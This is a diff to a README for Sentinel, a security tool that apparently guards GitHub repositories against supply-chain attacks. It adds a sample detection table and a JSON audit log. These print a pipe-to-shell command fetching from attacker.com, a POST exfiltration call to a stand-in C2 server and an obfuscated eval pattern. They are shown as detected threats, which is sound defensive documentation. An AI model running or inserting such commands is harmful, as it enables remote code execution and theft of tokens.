@@ -1,4 +1,6 @@
 # Sentinel: Local Security Guardian for GitHub Repositories
+> **Proactive Supply-Chain Evasion Detection & Zero-Trust Behavioral Guard for the Modern Developer.**
+
 
 **[Official Site](https://javier20dev25.github.io/Sentinel/) | [User Guide](docs/USER_GUIDE.md) | [CLI Reference](docs/CLI_REFERENCE.md) | [Sandbox Guide](docs/SANDBOX_GUIDE.md) | [Testing Guide](docs/TESTING_GUIDE.md) | [Architecture](docs/ARCHITECTURE.md) | [Policies](docs/POLICIES.md) | [Changelog](CHANGELOG.md)**
 
@@ -20,7 +22,8 @@ A diferencia de otras herramientas que se limitan al análisis de código estát
 
 ---
 
-Sentinel is a high-performance, local security monitoring and auditing suite designed to protect your GitHub repositories from vulnerabilities, secrets leakage, and unauthorized changes. It combines an Electron-based desktop application with a robust Node.js backend and a versatile CLI.
+Sentinel is a high-performance, local security monitoring and auditing suite designed to protect your GitHub repositories from vulnerabilities, secrets leakage, and unauthorized changes. It functions as a **Supply-Chain Firewall**, combining an Electron-based desktop application with a robust Node.js backend and a versatile CLI to ensure that no malicious code enters your production environment.
+
 
 ---
 
@@ -79,6 +82,37 @@ npm run sentinel
 * **Built-in CLI**: Run security audits, manage links, and trigger scans directly from your terminal.
 * **Hardened Command Execution**: Uses strict whitelisting and direct argument arrays to prevent shell injection (CWE-78).
 * **GitHub Auth Integration**: Secure OAuth flow via the official GitHub CLI for repository access.
+
+---
+
+## 🧪 Real-World Detection Output (Showcase)
+
+When Sentinel identifies a threat, it generates a high-fidelity report. Here is a sample output of a detected "Supply-Chain Injection" during an `npm install` cycle:
+
+| Threat Category | Evidence (Detection Vector) | Risk Score | Recommended Action |
+| :--- | :--- | :--- | :--- |
+| **🚨 Network Evasion** | `POST -> https://c2-malware-server.ru/exfil` | **9.8/10** | Immediate Revocation of NPM Tokens |
+| **🛡️ AST Mutation** | `eval(String.fromCharCode(...))` in `lib/index.js` | **8.5/10** | Quarantining Dependency |
+| **📦 Lockfile Poisoning** | Registry mismatch in `package-lock.json` | **7.2/10** | Re-generating Lockfile from Main |
+
+### Sample Sentinel Audit Log (JSON)
+```json
+{
+  "timestamp": "2026-04-14T18:56:00Z",
+  "repository": "user/enterprise-app",
+  "alerts": [
+    {
+      "type": "MALICIOUS_POSTINSTALL",
+      "severity": "CRITICAL",
+      "vector": "ChildProcess: curl -s http://attacker.com/sh | bash",
+      "sandboxed": true,
+      "mitigated": "PROCESS_TERMINATED"
+    }
+  ],
+  "engine_ver": "3.6.1-PRO"
+}
+```
+
 
 ---
 
